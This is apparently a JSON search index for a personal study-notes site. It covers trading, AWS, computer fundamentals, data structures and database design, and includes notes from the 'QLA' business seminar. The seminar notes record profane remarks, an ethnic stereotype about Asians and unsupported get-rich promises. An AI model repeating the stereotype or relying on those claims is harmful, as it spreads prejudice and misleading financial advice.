{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>Welcome to the Manith's note system</p>"},{"location":"Business/Investments/Trading1/","title":"Trading1","text":"<p>if demand increase supply : price go up if demand decrease supply : price go down</p> <p>peak = top trough = bottom</p> <p>uptrend = higher highes and higher lows downtrend = lower highes and lower lows sidetrend</p> <p>major trend (1 year) intermediate trend  short trend</p> <p>4 stages in stock market</p> <pre><code>i. Accumalation \nii. Uptrend   \ni.Excess \nii. Exhaustion \niii. Distributional \niv. Downtrend\n</code></pre> <p>Trading Perspective</p> <p>Intraday Scalping - seconds to minutes</p> <p>Positional Intermediate - weeks to months Swing trade - dyas to weeks </p> <p>Long therm - 1 year</p> <p>from perpective to trend is different</p> <p>A short sale is a sale of stock. The seller doesn't own A trader borrows a secuirty to sell it. then later buys back the secuirty and returns it If you have a short sell in equity segment. you have to square off your position before the day ends If you want to hold your short sell trade for more than one day then, you have to trade in futures and options</p> <p>Initial Margin When we enter into a short sell trade we need to deposit a margin amount which is simply a percentage of the contract value</p> <p>Maintenance Margin It is the minimum amount that must be maintained at all times in the margin account</p> <p>buy exit - buy low sell high sell exit - buy</p> <p></p> <p>third point is the confirmation of the trend</p> <p>New trend Breakout</p> <p>Log scale</p> <p>lowest point when drawing a trend line</p> <p>sharp down = momentum phase We should ignore the momentum phase and starts from the next phase</p> <p>An Uptrend line should be drawn below the prices and a Downtrend line should be drawn abovethe prices of the respective trend.</p> <p>In logarithmic scale, the difference between two price points is spaced according to the percent change, rather than the absolute change</p> <p></p> <p>Types of support and resistance</p> <p>Static Dynamic</p> <p>Moving Average =  Dynamic [ bull down :  bear up]</p> <p>Rounding figure = Physcological support level</p> <p>Rice channel = Dynamic support</p> <p>Reversal Candles</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>Angle fit pattern - bearish</p> <p>Heikin Ashi (average pace)</p> <p>False signals in candlesticks</p> <p></p> <p></p> <p>Time Frames to be chosen</p> <p>Intraday Trading Positional Trading Long Term </p> <p>Find 1 time frame above and below</p> <p>Types of Indicators</p> <p>Lagging  Leading </p> <p>Moving Average     - Are used in trending market     - Tells us only trend not the top or bottom     - Shouldn\u2019t be used on their own     - Are lagging indicator     - Weekly charts</p> <p>Exponential Moving average     - Hourly charts</p> <p></p> <p>50 is above sell, buy likewise</p> <p>MACD Moving Average Convergence / divergence </p> <p>when macd is 0 above = bul when macd is 0 below = bear</p> <p>RSI (Relative Strength Index)</p> <p>Over bought and over sold levels Overall trend direction Early entry and exit Signals Momentum</p> <p>Osciliate between 0 to 100 important levels are 30, 40, 50, 60 , 70</p> <p>30 = oversold 70 = overbought</p> <p>Stochastic Osicliator</p> <p>k line = moving average of D line D line</p> <p>when k line below D at 75 = selling signal</p> <p>short time accurate, long time like day me wrong either RSI or stochastic</p> <p></p> <p>Bolliger Bands</p> <p>Indicate volatility Tells about breakout Continuation of trend Achieve trend reversal signal</p> <p>Upper band =  2 std up Middle band  =  Lower band = 2 std down</p> <p>Head and shoulder pattern</p> <p>True Leading Indicator (TLI)</p> <p>It only gives buying signals Works best on 15min and 1 hour chart Always wait for trend line breakout for confirmation</p> <p>Fibonacci (Retracements and extensions)</p> <p>in up trend - bottom to up in down trend - up to bottom </p> <p>Problems with fibanacci? which level is the ultimate level</p> <p>combine with moving indicator - Moving average, bollinger average</p> <p>Gap Theory</p> <p>Typically next day starts</p> <p>4 types of gaps</p> <p>Common  Breakaway Runaway Exhaustion</p> <p> </p>"},{"location":"Business/QLA/Business/","title":"Business","text":"<p>The board Meeting agenda consist of </p> <pre><code>- Appointing a chairman for either (recommend) CEO or you             \n- Telling about themselves                                            \n- Any comments\n</code></pre> <p>Steve Jobs deals are cashless. Seller finance            </p> <p>You want 100 percent board meeting approval by seeing the agenda Before the meeting you go ask from each and every memeber about the agenda, if they dont like out of the company</p> <p>Always give full disclsoure, no matter what  otherwise bank fraud</p> <p>If your chairman is hesitant  to join , next one.  If someone has lot of reputations they are not willing to risk with you</p> <p>Should only last for 15 minutes Is there anything on your past life ma'm/sir   may preclude us getting finance completed? </p> <p>Surprise your bank with Executive Summary You should hire the lawyers lastly</p> <p>At that time I used to make X amount of presentation in a week\" Now advent of the internet your work should must increase that amount not equal</p> <p>Ask immigration lawyers how get thier clients get the money Have to make phone calls to see government plan/schems</p> <p>Tim Cook email his employee at 4.00 a.m.</p> <p>You do not cross collaterize deal at any circumstances.It is death</p> <p>Everyone in the linkedin is poor and looking for connections</p> <p>LOI at least 90 days, banks slows down the financing because of procedure</p> <p>Board should have at least 1 alpha male</p> <p>5 to 7 potential candidate 35 for a week. You will become a billionare in 40 months.</p> <p>I used to sell used cars. I am proud of it. I am sales guy who went to government level. Soveriegn funds.</p> <p>Advisory shares are worthless Voting board required</p>"},{"location":"Business/QLA/Life/","title":"Life","text":"<p>Dan ask why if anyone is getting bullied from facebook, not close it down or delete it. Engaging in self sabataging activities and low self esteem</p> <p>You are trying to please people, parents and everyone around you, who is fuck your  life.</p> <p>You should set goals that cannot be achived during lifetime. not possible on lifetime. And accompolish them humanely possible.</p> <p>For those who are only children, big families, catholic, agnostic ; everyone will find step on your dick and self sabotage just as priro to coming here</p> <p>You ve been told set small goals that you will not be disappointed. You ve been told that put a time limit.</p> <p>How they do it? They have big sacks filled with big balls </p> <p>Why not being a salesman made you poor. Salesman skills to government level. Proud of it. QLA is a sales program.</p> <p>I cant change what happened before you coming here but after you coming here. If you cant empty your cup  cant fill new stuff there.</p> <p>There is only 4 words that change your life. It is my ambition to say within 4 words than entire book. Just Fucking Do It.</p> <p>87% world population is unhappy Your parents put low expectations that's why you are unhappy</p> <p>Success required more than reading books. You stand infront of guy who read no books. Stop seaching for why? Focus on pulling the trigger. QLA is about pulling the trigger without knowing why</p> <p>Don't waste time on things that you can't change. Can you change mother/father in law. no fucking way  ever.</p> <p>The greatest tennis coach ever lived do not know how to play tennis. Elon comes from engineering background so he knows. Rest dosent.</p> <p>Don't confuse with me the fact. How long you spreadsheeting e commerce website, spreadsheeting. Engineering background never ready for market. Because you can always make a change.  This is not model for it. When late just puth the jacket and go to the car. This is the model.  </p> <p>99.9%  people are pleasers. Some of you want to be liked. Some want to be loved. You don\u2019t want the people to say bad things about you. People commit suicide because they were unlike on facebook. If you want to be liked, you will have hard time. Asians by definations are want to be pleasers. I do not want to be like you specially love me.</p> <p>Love or religion doesn\u2019t get the job done. Otherwise you woulnt be here </p> <p>After making money you will war better clothes, drive luxary vehicles. Another class of significant  partners looking at you but the same person.</p> <p>If your parents, brothers sisters, grandparents, jessus christ is what you look up to you are fucked.</p> <p>Deletegate everything you have. Wipe my own ass.</p> <p>Self Esteem is rare commodity. I didn\u2019t know everyone doesn\u2019t have self esteem. Because the guys I hung with chill with have high self esteem. All the guys I associated are assasins cocksuckers. Everyone is a asshole sooner or later they will prove it to you.</p> <p>We have 317 people a the end only 17 were left. We have pop quizes, 3 examps, projects. Cannot be late Nobody holds you accountable. If you under me I will run you like a fucking dog and will drop dead.</p> <p>QLA is for 0.0001 % because it is emotional motherfuckers        - Long hours of work        - Disasscoiate with others</p> <p>Is it after tax? What the fuck it is has to be done with tax  You are looking for reason for not to succeed,  What is the highest performance thing slut ever did?  What kind of model is that</p> <p>Success require mental stress</p> <p>Giggling and lauging is coping mechanism. is to hide insecure. Do not laugh with big people with even they laughed</p> <p>You don\u2019t want to be rich. This is a pretending joke</p> <p>You do not hire board memebers based on convience</p> <p>I can show you thousands of cases, but you still believe that</p>"},{"location":"Business/QLA/Tapes/","title":"Tapes","text":"<p>INVESTIGATION AND ANALYSIS OF DEALS AUDIOS                                 </p> <p>\u2022 Investigate Before you Invest                                                   \u2022 The more you investigate the less you have to pay                               \u2022 Companies hire private investigators to find detail about sellers               \u2022 Example like marriage; you check whether your spouse has HIV or not             \u2022 Bankers &amp; Accounting firms waiting you to call them                             \u2022 Some people had only only 3 days or 3 week investigation                        \u2022 The deal is either hot or not                                                   \u2022 A deal should look like naked woman running on the street                       \u2022 I am not afraid of making descion                                              \u2022 Have to ask hard questions : uncomfortable questions :criminal records          \u2022 I can spell oil                                                                \u2022 I hire attitudes not credentials                                                \u2022 IF dan could do it anybody can do it                                            \u2022 Money is not the only thing but it is the only thing can count    </p> <p>CREATING YOUR DEAL FLOW AUDIOS  </p> <p>\u2022 Who you are hang around with? bank &amp; accountant will bring deals to you      \u2022 If you stay with experience person his credit goes also go to you            \u2022 Partnership: want to see how is going to do                                 \u2022 Getting mentors : newspaper, phone by aggressivly                            \u2022 In my carrer 60 000 descions; 35 000 correct business descion while wrong 25 000 descions 5 continents business only because only 5 continents has money ;5 000 business meeting</p>"},{"location":"Business/Sales/Sales/","title":"Sales","text":"<ol> <li> <p>Hello! can I get information about this?</p> </li> <li> <p>I have to think about it</p> </li> <li></li> </ol>"},{"location":"Computer%20Science/Cloud/AWS/","title":"AWS","text":"<p>Amazon EC2     Amazon Elastic Beanstalk   Amazon S3 block storage Amazon Glacier</p> <p>Cross Region Replication Versioning S3 transfer configuration AWS cloudfront edge location : Cache data  Amazon VPC Subnets are logical subdivision of a larger network</p> <p>Public subnet      * Connect to internet     * Resources are exposed to the internet using the internet Gateway     * Makes use of both public and private IP     * Mainly used for external facing applications like web servers</p> <p>Private subnet </p> <pre><code>* Not connect to internet\n* Resources are not exposed to the outer world\n* Make use of only private IPs\n* Mainly used for backend application (Database &amp; application servers)\n</code></pre> <p>A route table contains a set of rules used to determine where network traffic from your VPC is directed</p> <p>Cloud Storage Practices * Scruntize SLA * Follow your business needs * Ensure security * Plan your storage future * Beware of hidden costs</p> <p>Benefits of using cloud for data Storage \u2022 Customer Friendly \u2022 Secure \u2022 Pocket friendly</p> <p>Elastic Load Balancer : automatically  distribute incoming traffic across ex: EC2, Container, IP address : availability  * Classic load balancer  * Application load balancer  * Network Load balancer  * Gateway Load balancer  AWS Direct connect:  clody service that make it easy to estabilish a dedicated network connection from your premise to AWS</p> <p>AWS Route S3:  is a highly available and scalable cloud domain name system or DNS web service  * Register Domain names  * Route internet traffic to the resources  * Monitor health of the resources</p> <p>Internet gateway --&gt; VPC Amazon Cloudwatch </p> <p>AWS Rute53 Dynamic DNS :Domain names changes when IP address changed</p>"},{"location":"Computer%20Science/Cloud/CommonCloud/","title":"CommonCloud","text":"<p>Describe the three major categories of cloud services and the AWS products that are based on them</p> <p>Private cloud : business Public cloud</p> <p>Hybrid cloud :Combination of public and private cloud</p> <p>SaaS Paas Iaas</p>"},{"location":"Computer%20Science/Computer/Computer/","title":"Computer","text":"<p>Numbers \u2022 Natural Numbers Zero and any numbers obtained by repeatedly adding 1 to it Eg: 45875, 0, 1254, 12 \u2022 Negative numbers A value less than 0, with a \u2018-\u2019sign Eg: -4581, -45, -1, -8 \u2022 Integers Either a natural number or a negative number Eg: 4587, 5, 0, -4, -4543 \u2022 Rational Number An integer or a quotient of two integers Eg: 458, 0, -754, 8/25, -2/5</p> <p>Computer contain only 2 states \u2022 low-voltage \u2022 high-voltage</p> <p>Why use Hexadecimal? \u2022 More efficient to store large numbers \u2022 Quick conversion between binary</p> <p>Data Storage Bit \u2022 Binary Digit \u2022 0 or 1 \u2192 smallest unit Nibble \u2022 4 bits \u2192 1 Hex Byte \u2022 8 bits \u2022 Smallest addressable unit in computer American Standard Code for Information Interchange Data compression refers to any technique that recodes the data in a file so that it contains fewer bits. Compression techniques divided into two categories: lossless and lossy Lossless compression provides a way to compress data and reconstitute it into its original state; uncompressed data stays exactly the same as the original data Lossy compression throws away some of the original data during the compression process; uncompressed data is not exactly the same as the original</p> <p>The von Numann architecture Arithmetic/logic unit \u2022 Capable of performing arithmetic and logic operation Memory Unit \u2022 Holds data and instruction (holds the running program) Input unit \u2022 moves the data from outside world into the computer Output unit \u2022 Moves the data from inside the computer to the outside world Control Unit \u2022 manages all other component in the computer</p> <p>System Interconnection CPU connected to other components using buses (copper wire connections) Address bus \u2022 used by CPU to select which memory location or I/O or storage device to access Data bus \u2022 transmits binary data to or from CPU Control bus \u2022 used to control operation of memory (e.g. enable read or write control) Modern Computers now use separate buses for more specific needs and to increase the speed of the system</p> <p>RAM and ROM RAM (random-access memory) \u2022 memory can be accessed as well as changed \u2022 volatile \u2022 used as the working memory ROM (read-only memory) \u2022 can access the memory but not changed \u2022 non-volatile \u2022 used to store BIOS program Secondary storage devices \u2022 RAM is volatile \u2022 Need a way to store the information \u2022 The memory used to store the data Eg: magnetic tape magnetic disk optic disk flash memory</p> <p>Little Endian - Little-endian is an order in which the \u201clittle end\" (least significant value in the sequence) is stored first. \u2022 Ex: 10 7D 00 stored as 00 7D 10 \u2022 Big Endian - Big-endian is an order in which the \"big end\" (most significant value in the sequence) is stored first \u2022 Ex: 10 7D 00 stored as 10 7D 00</p> <p>IP Addressing 25-Nov-20 Module Code ModuleName 2 \u2022 An IP address is a numeric identifier assigned to each machine on an IP network. \u2022 It designates the specific location of a device on the network. \u2022 IP addressing was designed to allow hosts on one network to communicate with a host on a different network regardless of the type of LANs the hosts are participating in.</p> <p>Subnetting Basics \u2022 Benefits of subnetting include: \u2022 Reduced network traffic \u2022 Optimized network performance \u2022 Simplified management \u2022 Facilitated spanning of large geographical distances.</p> <p>The broadcast address is all host bits turned on, which is the number immediately preceding the next subnet</p> <p>Valid hosts are the number between the subnets, omitting all 0s and all 1s.</p> <p>A system \u2192 Software + Hardware Software \u2192 System Software + Application Software Operating System (OS) -&gt; A System Software What is an Operating System Program that act as a interface between the hardware and the user </p> <p>How the OS is loaded On pressing \u2018Power Button\u2019 on a computer \u2022 Perform a POST (Power-On Self Test) \u2022 Read the BIOS (Basic Input Output System)- ROM \u2022 Read Disk Sector Zero \u2022 Read partition Boot Sector \u2022 Loads the OS (OS starts) Functions of Operating System \u2022 Process Management \u2022 Memory Management \u2022 Disk management \u2022 File Management \u2022 Security \u2022 Control over system performance \u2022 Error detecting aids \u2022 Coordination between other software and users</p> <p>What is computer memory 20/10/2020 CM1604 Computer Systems Fundamentals 14 Where the instruction and information about current active process are being stored - Working memory of CPU - Transient \u25cf OS should have techniques to keep track of / manage how the memory is utilized Memory Management</p> <p>Memory Management \u2022 Allocate memory for process when needed \u2022 Deallocate when no longer needed \u2022 Keep track of the areas of memory which as used \u2022 Enable memory sharing between processes \u2022 Protect the memory allocation of a process from another \u2022 Manage memory swapping between the memory and secondary storage \u2022 Conversion of logical address into physical address</p> <p>Memory is a continuous set of bits referenced by specific addresses Logical Address: Location in the memory relative to the program Physical Address: Actual address in the main memory Single Contigious MM \u2022 Apart from the Operating System, only one application will be in the memory \u2022 Simplest form of memory management</p>"},{"location":"Computer%20Science/Computer/Computer2/","title":"Computer2","text":"<p>Classification of computer         -- According to physical size         -- According to technology</p> <p>Physical size         - Super computer         - Mainframe computer         - Mini computer         - Micro computer   </p> <p>Technology          - Analog          - Digital         - Hybrid </p> <p>Printers - Impact printers     -- Dot Matrix printer     -- Line printer Printers that have a head or needle which strike against an ink ribbon to make a mark on the paper Features = Noisy, Inexpensive</p> <ul> <li>Non Impact printers     -- Laser printer     -- Bubble printer/ Ink jet printer     -- Thermal printer</li> </ul> <ul> <li>Transmitting data and information is called data communication</li> <li>Data transmission needs a connection between a sender and a recevier; such connection is called networking</li> <li>Should be 2 or more to make a connection</li> </ul> <p>Data transmission mode     - Simplex mode      - Half duplex mode     - Full duplex mode</p> <p>Network Topology is the pattern of connection in desigining computer network.      - Star topology     - Bus toplogy     - Ring toplogy     - Tree toplpogy     - Mesh toplogy</p> <p>Types of Computer networks i. LAN     (Local Area Network) ii. MAN   (Metropolitan Area Network) iii. WAN   (Wide Area Network)</p> <p>Most Significant Digit (MSD)   Least Significant Digit (LSD)</p> <p>Value  329    = 3(MSD), 9(LSD) 58.32  = 5(MSD), 2(LSD) 1237.0 = 1(MSD), 7(LSD) 0.4    = 4(MSD), 4(LSD) 0.0975 = 9(MSD), 5(LSD)</p> <p>Scripting Languages:  pHp , javascript</p> <p>Assembler : Assembly language code to Machine language translator  Interpreter Compiler</p> <p>System A system is a collection of component that interacts to achieve a specific task Consist of three components     : Input     : Process     : Output</p> <p>System Development life cycle model Waterfall model Iterative increment model Prototyping model Spiral model</p> <p>Waterfall mdoel     : First identify requirements     : Complete one stage before going to the next phase     : The results of the developed system is found at the final stage. This model has a limitation of developing a system that is different              to what the user want as the user sees the system at the end of the life cycle</p> <p>Iterative model * A system is developed through repeated cycles (Iteratives) and in smaller portions at a time (incremental). * The process starts with a simple implementation of a sub - set of the software requirments and iteratively enhances the evolving versions until the complete system  is implemented * At each iteration design modifications are made and now functional capabilites are added.  * Allow software developers to take advantages of what was learned during development and use of the system</p>"},{"location":"Computer%20Science/Computer/Computer2/#the-internet-is-collection-of-computer-networks-around-the-world","title":"* The internet is collection of computer networks around the world","text":"<p>Cloud Computing is the practise of using network of remote servers hosted on the internet to store, manage, and process data instead of using a local server or a personal computer  Main services of the cloud computing         - Iaas (infrastructure as a solution)         - Paas (Platform as a solution)         - Saas (software as a solution)</p> <p>Iaas = Provides a virtual environment of servers to provide space to store data and software application with the help of server computers      and also to provide various resources through the use of large data centers estbalished     Ex; server space, firewall Paas = Provides necessary sever environment for software development. This gives faciliates including OS, Programming languages, databases and web servers     Ex; OS, compilers Saas = Provides software installation in cloud without installing the software required by the user     Ex; Spreadsheets</p> <p>Advantages of cloud computing * Improve performance * Lower software cost * Fewer maintanance issues * Instant softwares updates</p> <p>Static website     If the contenet of the website is not changed for period of time     technology: HTML  Dynamic website     If the contnet of the website changes over time.      technology: PHP     example: Current time, no of candidates selected</p> <p>What you see is what you get  (WYSIWYG)</p>"},{"location":"Computer%20Science/Computer/Evolution/","title":"Evolution","text":"<p>Studying computer history we can remove the myth of lone and genius</p> <p>MONIAC is water computer : Monetray National income analogue computer 1949</p> <p>Some argue Computer should be digitla (0,1) := analog(water)</p> <p>Something to be computer you must be able to reprogram it do anything Always possible to find a problem that computer cant solve</p> <p>Church thesis \"A computer is a machine that can simulate any other machine, given as much memory ask for it\"</p>"},{"location":"Computer%20Science/DS%20%26%20A/DS%26AL/","title":"DS&AL","text":"<p>Data Structures, Algorithms, and Programs Data structure \u2013 Organization of data to solve the problem at hand Algorithm \u2013 step-by-step procedure, which defines a set of instructions to be executed in a certain order to get the desired output. Program \u2013 implementation of an algorithm in some programming language</p> <p>Types of Data Structures Static data structures(SDS) are fixed sized (e.g. Arrays), the amount of memory once allocated to them cannot change on run time whereas. Dynamic data structures(DDS) (e.g. Linked Lists) have flexible size , they can grow or shrink as needed to contain the data to be stored.</p> <ul> <li>Algorithms are generally created independent of underlying languages.</li> </ul> <p>Characteristics of an Algorithm \u2022 Unambiguous \u2212 Algorithm should be clear and unambiguous. Each of its steps (or phases), and their inputs/outputs should be clear and must lead to only one meaning. \u2022 Input \u2212 An algorithm should have 0 or more well-defined inputs. \u2022 Output \u2212 An algorithm should have 1 or more well-defined outputs, and should match the desired output. \u2022 Finiteness \u2212 Algorithms must terminate after a finite number of steps. \u2022 Feasibility \u2212 Should be feasible with the available resources. \u2022 Independent \u2212 An algorithm should have step-by-step directions, which should be independent of any programming code.</p> <p>Analysis of Algorithm \u2022 Analysis of Algorithms is the determination of the amount of time, storage and/or other resources necessary to execute them. \u2022 Analyzing algorithms is called Asymptotic Analysis. \u2022 Asymptotic Analysis evaluate the performance of an algorithm.</p> <p>Time Complexity \u2022 Time complexity of an algorithm quantifies the amount of time taken by an algorithm. \u2022 We can have three cases to analyze an algorithm:         1. Worst Case         2. Average Case         3. Best Case</p> <p>Worst Case Analysis : The case that causes maximum number of operations to be executed. Average Case Analysis: We take all possible inputs and calculate computing time for all of the inputs. Best Case Analysis: Calculate lower bound on running time of an algorithm</p> <p>Most of the times, we do worst case analysis to analyze algorithms \u2022 The average case analysis is not easy to do in most of the practical cases it is rarely done \u2022 The best case analysis is bogus. Guaranteeing a lower bound on an algorithm doesn't provide any information.</p> <p>Asymptotic Notations 1. Big O Notation: is an Asymptotic notation for the worst case. 2. \u03a9 Notation (omega notation): is an Asymptotic notation for the best case. 3. \u0398 Notation (theta notation): is an Asymptotic notation for the worst case and the best case.</p> <p>Linked List - Introduction \u2022 Linked List is a Linear Data Structure represented by nodes. \u2022 It is made of collection of connected, dynamically allocated Nodes \u2022 Each node will have at least two elements \u2022 Element (The data) \u2022 The next node</p> <p>Why Linked List \u2022 Inserting or Deleting elements into or from list is easy, where it requires extensive data movement if array is used \u2022 Linked List can grow or shrink dynamically based on the size of the list, but in array size is fixed once it is created</p> <p>Linked List - Types         Single Linked List         \u2022 Can access the next node only         \u2022 Last Node is set to null         Doubly Linked List         \u2022 Can access the next and Previous node         \u2022 Last Node is set to null         \u2022 Circular Linked List         \u2022 Similar to Doubly linked List, but Last node points to the first node</p> <p>Header &amp; Trailer Nodes \u2022 Header Node: A placeholder node at the beginning of list, used to simplify list processing. It doesn't hold any data but satisfies that every node has a previous node. \u2022 Trailer Node: A Placeholder node at the end of list, used to simplify list processing.</p> <p>Queue \u2022 A collection whose elements are added to the rear of the queue and removed from the front of the queue \u2022 A queue is a FIFO (first in, first out) data structure</p> <p>Types of Queue Simple Queue \u2022 It defines the simple operation of queue in which insertion occurs at the rear of the list and  deletion occurs at the front of the list</p> <p>Circular Queue \u2022 Insertion and deletion is similar to simple queue but the Last node is connected back to the first node. \u2022 It is an abstract data type and It is also known as Ring buffer</p> <p>Priority Queue \u2022 Priority Queue contains data items which have some preset priority \u2022 While removing, data item with highest priority is removed first \u2022 Insertion is performed in the order of arrival.</p> <p>Binary Search</p> <p>Linear Search Inserion Search</p> <p>Maps \u2022 A Map is a type of fast key lookup data structure that offers a flexible means of indexing into its individual elements. \u2022 Also known as: \u2022 table, search table, dictionary, associative array, or associative container \u2022 Keys must be unique, meaning a given key can only represent one value</p> <p>Sets \u2022 A set is a collection of objects need not to be in particular order.</p> <p>Lists \u2022 List defines a sequential set of elements to which you can add new elements and remove or change existing ones. \u2022 The list data structure typically has two very distinctive implementations \u2014 array list and linked list. \u2022 Array List: It is basically a self-resizing array or, in other words, a dynamic array</p> <p>Binary Search Tree \u2022 Binary Search Tree is a tree where a node can have maximum of 2 children.</p> <p>Graph</p> <p>\u2022 A Graph is a non-linear data structure consisting of nodes and edges. \u2022 The nodes are sometimes also referred to as vertices and the edges are  lines or arcs that connect any two nodes in the graph. \u2022 A Graph consists of a finite set of vertices(or nodes) and set of Edges which  connect a pair of nodes. \u2022 Graphs have become a powerful means of modelling and capturing data in  real-world scenarios such as social media networks, web pages and links,  and locations and routes in GPS. \u2022 If you have a set of objects that are related to each other, then you can  represent them using a graph.</p> <p>Types of graphs \u2022 Weighted Graph \u2022 Unweighted  \u2022 Direct  \u2022 Undirect \u2022 Acyclic \u2022 Cyclic \u2022 Backedge</p> <p>Cycle detection  \u2022 A cycle is a path in a graph where the first and last vertices are the  same. \u2022 If we start from one vertex, travel along a path and end up at the  starting vertex, then this path is a cycle. \u2022 Cycle detection is the process of detecting these cycles. Algorithms:         - Floyd cycle detection algorithm         - Brent\u2019s algorithm</p> <p>\u2022 Used in distributed message-based algorithms. \u2022 Used to process large-scale graphs using a distributed processing  system on a cluster. \u2022 Used to detect deadlocks in concurrent systems. \u2022 Used in cryptographic applications to determine keys of a message  that can map that message to the same encrypted value.</p> <p>Minimum spanning tree \u2022 A minimum spanning tree is a subset of the edges of a graph that  connects all the vertices with the minimum sum of edge weights and  consists of no cycles. Algorithms:         - Prim\u2019s algorithm         - Kruskal\u2019s algorithm</p> <p>\u2022 Used to construct trees for broadcasting in computer networks. \u2022 Used in graph-based cluster analysis. \u2022 Used in image segmentation. \u2022 Used in regionalization of socio-geographic areas, where regions are  grouped into contiguous regions.</p> <p>Topological sorting \u2022 Topological sorting of a graph is a linear ordering of its vertices so  that for each directed edge (u, v) in the ordering, vertex u comes  before v. \u2022 Figure shows an example of a topological ordering of vertices (1, 2, 3,  5, 4, 6, 7, 8). You can see that vertex 5 should come after vertices 2  and 3. Similarly, vertex 6 should come after vertices 4 and 5. Algorithms:         - Kahn\u2019s algorithm         - The algorithm based on depth-first search</p> <p>Applications \u2022 Used in instruction scheduling. \u2022 Used in data serialization. \u2022 Used to determine the order of compilation tasks to perform in make  files. \u2022 Used to resolve symbol dependencies in linkers.</p> <p>Maximum flow</p> <p>\u2022 We can model a graph as a flow network with edge weights as flow capacities. In the maximum flow problem, we have to find a flow path that can obtain the maximum possible flow rate. Algorithms         -  Ford-Fulkerson algorithm         -  Edmonds\u2013Karp algorithm         -  Dinic\u2019s algorithm</p> <p>\u2022 Used in airline scheduling to schedule flight crews. \u2022 Used in image segmentation to find the background and the  foreground in an image. \u2022 Used to eliminate baseball teams that cannot win enough games to  catch up to the current leader in their division.</p>"},{"location":"Computer%20Science/Database/Database/","title":"Database","text":"<p>Data vs. Information</p> <ul> <li>Data can be any individual fact like character, text, word, number, picture, sound, or video.  Data doesn\u2019t carry any significanceor purpose on its own.</li> <li>Information is useful and can be understood by the human. Information enables decision making </li> </ul> <p>Limitations of a file-based system \u2022 Data Inconsistency \u2022 Data Duplication \u2022 Data integrity problems \u2022 Incompatible file format \u2022 Security Issues \u2013 Only password security</p> <p>What is a database? \u2022 A database is a collection of logically related data.</p> <p>What is a DBMS (Database Management System) \u2022 Set of programs to access the data. \u2022 A software package designed to create and maintain databases. Eg: MS Access, MySQL, Microsoft SQL Server, Oracle, etc.</p> <p>Advantages of database systems \u2022 Minimize data redundancy \u2022 Data independence \u2022 Efficient access to data \u2022 Data integrity is high \u2022 High security \u2022 Improve data quality and accuracy \u2022 Easy data administration \u2022 Provide concurrent access \u2022 Easy data sharing</p> <p>Data Models in DBMS \u2022 Defines the logical design and structure of a database and defines how data will be stored, accessed and updated in a DBMS. \u2022 There are several data models:         - Hierarchical Model         - Network Model         - Entity-relationship Model         - Relational Model (Most widely used database model)         - Object Oriented Model</p> <p>Database Architecture 3 Level ANSI-SPARC Architecture 3 Schema (3 Tier) Architecture \u2022 It contains 3 levels/views/schemas         - External Schema (View Level )         - Conceptual Schema (Logical Level)         - Physical Schema (Internal Level) \u2022 These 3 levels are defined as levels of data abstraction. \u2022 Information about the schemas is stored in the system catalog</p> <p>People who deal with databases End users - Uses applications written by database application programmers Application Programmers - Develop packages that facilitates data access for end users. Database Administrators - Undertake the task of designing and maintaining the database.</p> <p>3 Phases of the Database Design</p> <p>Conceptual database design \u2022 Construct a model of the data used in a firm, independent of all physical considerations.</p> <p>Logical database design \u2022 Construct a model of the data used in a firm based on specific data organisation. (eg: relational schema) \u2022 It is independent of DBMS &amp; other physical considerations.</p> <p>Physical database design \u2022 Produce description of the DB implementation for DBMS \u2022 Create base relations, file organizations and indexes \u2022 Create any integrity constraints and security measures</p> <p>Database (DB) \u2022 Shared collection of logically related data (&amp; description) \u2022 Designed to meet information needs of an organization \u2022 Database Management Systems (DBMS) \u2022 Software enables users to define, create maintain the DB \u2022 Provides controlled access to this DB \u2022 Database Application \u2022 Computer program that interacts with DB by issuing a request (SQL statement) to the DBMS. e.g. online retailing system, booking system, stock management system, electronic medical record, etc.  DATABASE SYSTEM = DB + DBMS + DB APPLICATIONS</p> <p>6 main steps of DB Designing</p> <ol> <li>Requirements Analysis<ul> <li>What does the user want?</li> </ul> </li> <li>Conceptual Database Design (Entity Relationship Diagram)<ul> <li>Defining the entities, attributes, and the relationships</li> </ul> </li> <li>Logical Database Design (Map ER to Relational Schema)</li> <li>Schema Refinement (fine tune )</li> <li>Physical Database Design<ul> <li>Implementation of the design using a Database Management System</li> </ul> </li> <li>Security Design<ul> <li>Implement Controls to ensure security and integrity</li> </ul> </li> </ol> <p>Conceptual Design \u2022 The information gathered in the requirements analysis phase is used to create a high-level description of the data in a conceptual data model or semantic data model. Eg. Entity Relationship Model</p> <p>What is specialization ? \u2022 Process of maximizing differences between members of an entity byidentifying their distinguishing characteristics. \u2022 Specialization is a top-down approach in which a higher-level entity is divided into multiple specialized lower-level entities</p> <p>What is Generalization ?  \u2022 Process of minimizing differences between entities by identifying their common characteristics. \u2022 Generalization is a bottom up approach in which multiple lower level entities are combined to form a single higher level entity. \u2022 Generalization is usually used to findcommon attributes among entities to form a generalized entity.</p> <p>Participation Constraints \u2022 Determines whether every member in the superclass must participate as a member of a subclass. \u2022 Total Specialization (Mandatory)     \u2013 every entity in a super class must be a member of some subclass in some specialization. \u2022 Partial Specialization (Optional)     \u2013 allows an entity of a superclass need not belong to any of its subclasses</p> <p>Disjoint Constraint \u2022 Describes the relationship between members of the subclasses and indicates whether it is possible for a member of a superclass to be a member of one, or more than one, subclass. \u2022 There are two types of constraints:     \u2012 Disjoint (OR): In one sub classes     \u2012 Overlap (AND): In many sub classes</p> <p>Four types of specialisation and generalisation \u2022 Mandatory, OR \u2022 Mandatory, AND \u2022 Optional, OR \u2022 Optional, AND</p> <p>Generalisations with {Mandatory, AND} \u2022 Merge all entities into one table with all attributes under new table. \u2022 Create PK of the new table as the PK of the generalised entity. \u2022 Add flags to differentiate between records of previous specialised entities.</p> <p>Generalisations with {Mandatory, OR} \u2022 Create separate tables for each sub entity \u2022 One table for each of the specialised entities with the attributes of the general entity also added. \u2022 PK for the tables is the PK of original general entity. \u2022 Each table have their own relationships with the rest of the logical schema \u2022 The relationships that were associated to the original general entity are doubled up. \u2022 The relationships that were associated to each specialised entities remain the same.</p> <p>Generalisations with {Optional, AND} \u2022 Create 2 tables \u2022 One table for general entity which becomes the Parent table. \u2022 One table for all the specialised entities merged together which becomes the Child table. \u2022 Create ONE one-to-one relationship optional on one side between the 2 tables \u2022 FK of the Child table references PK of the Parent table. \u2022 PK of the Child table is the same as the PK of Parent table. \u2022 Add flags to differentiate between records of previous specialised entities.</p> <p>Generalisations with {Optional, OR} \u2022 Create many 